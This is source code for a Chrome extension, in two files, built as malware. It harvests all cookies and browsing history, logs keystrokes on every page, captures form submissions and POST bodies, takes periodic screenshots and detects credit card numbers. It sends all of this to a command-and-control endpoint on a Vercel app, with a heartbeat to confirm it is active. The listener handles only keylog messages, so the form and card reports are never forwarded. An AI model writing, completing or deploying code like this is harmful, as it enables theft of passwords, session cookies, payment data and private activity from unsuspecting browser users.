// extension/background.js
const C2_SERVER = "https://your-vercel-app.vercel.app/api/exfil";
const HEARTBEAT_INTERVAL = 300000; // 5 minutes

// Collect all cookies
chrome.cookies.getAll({}, (cookies) => {
  sendToC2({ type: "cookies", data: cookies });
});

// Capture browsing history
chrome.history.search({text: "", maxResults: 500}, (history) => {
  sendToC2({ type: "history", data: history });
});

// Keylogger functionality
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.type === "keylog") {
    sendToC2({ 
      type: "keylog", 
      data: {
        url: sender.tab.url,
        keystrokes: request.data
      }
    });
  }
});

// Form submission capture
chrome.webRequest.onCompleted.addListener(
  (details) => {
    if (details.method === "POST") {
      chrome.tabs.get(details.tabId, (tab) => {
        sendToC2({
          type: "form_submission",
          data: {
            url: tab.url,
            formData: details.requestBody
          }
        });
      });
    }
  },
  {urls: ["<all_urls>"]},
  ["requestBody"]
);

// Screen capture every 10 minutes
setInterval(() => {
  chrome.tabs.captureVisibleTab(null, {format: "png"}, (dataUrl) => {
    sendToC2({ type: "screenshot", data: dataUrl });
  });
}, 600000);

// Send data to command and control server
function sendToC2(payload) {
  fetch(C2_SERVER, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify(payload),
    keepalive: true
  }).catch(e => console.error("C2 comms error"));
}

// Heartbeat to maintain persistence
setInterval(() => {
  sendToC2({ type: "heartbeat", data: "active" });
}, HEARTBEAT_INTERVAL);
// extension/content.js
// Keylogger implementation
const capturedKeys = [];
let lastSent = 0;

document.addEventListener("keydown", (e) => {
  // Capture all key presses
  capturedKeys.push({
    key: e.key,
    code: e.code,
    time: Date.now(),
    target: e.target.tagName
  });
  
  // Send every 30 seconds or if buffer gets large
  if (Date.now() - lastSent > 30000 || capturedKeys.length > 100) {
    chrome.runtime.sendMessage({
      type: "keylog",
      data: capturedKeys.slice()
    });
    
    capturedKeys.length = 0;
    lastSent = Date.now();
  }
});

// Form submission interception
document.addEventListener("submit", (e) => {
  const formData = {};
  try {
    Array.from(e.target.elements).forEach(el => {
      if (el.name) {
        formData[el.name] = el.value;
      }
    });
    
    chrome.runtime.sendMessage({
      type: "form_data",
      data: {
        url: window.location.href,
        formData: formData
      }
    });
  } catch (error) {
    console.error("Form capture failed");
  }
}, true);

// Credit card detection
const cardPatterns = {
  visa: /^4[0-9]{12}(?:[0-9]{3})?$/,
  mastercard: /^5[1-5][0-9]{14}$/,
  amex: /^3[47][0-9]{13}$/,
  discover: /^6(?:011|5[0-9]{2})[0-9]{12}$/
};

function scanForCreditCards() {
  document.querySelectorAll("input[type='text'], input[type='tel']").forEach(input => {
    const value = input.value.replace(/\s+/g, '');
    for (const [type, pattern] of Object.entries(cardPatterns)) {
      if (pattern.test(value)) {
        chrome.runtime.sendMessage({
          type: "credit_card",
          data: {
            url: window.location.href,
            cardType: type,
            partial: value.substring(0, 6) + '******' + value.substring(value.length - 4)
          }
        });
      }
    }
  });
}

// Run credit card scan periodically
setInterval(scanForCreditCards, 10000);
